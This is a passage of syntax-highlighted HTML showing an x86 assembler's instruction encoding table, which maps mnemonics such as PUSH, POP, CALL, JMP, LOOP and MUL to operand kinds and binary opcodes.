 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">          </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111000001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">          </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111100110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">          </span><span class="sc5">Seg0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111110000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">           </span><span class="sc5">SegOld</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">variance8</span><span class="sc0">           </span><span class="sc5">Imm8</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01101010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">           </span><span class="sc5">Imm</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">          </span><span class="sc5">MemWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000111100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">          </span><span class="sc5">Seg0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111110000001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">           </span><span class="sc5">SegOld</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">instruction8</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">           </span><span class="sc5">ImmNEAR</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0"> </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">           </span><span class="sc5">ImmFAR</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 


 </span><span class="sc5">instruction8</span><span class="sc0"> </span><span class="sc5">Jcc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Short0</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">          </span><span class="sc5">Near0</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111110000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemFar</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111100011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Near0</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Far0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111100010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemFar</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111100101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Short0</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Near0</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Far0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111100100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Short0</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Short0</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LOOPZ</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Short0</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">LOOPNZ</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Short0</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111011000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111011000011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111011000010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

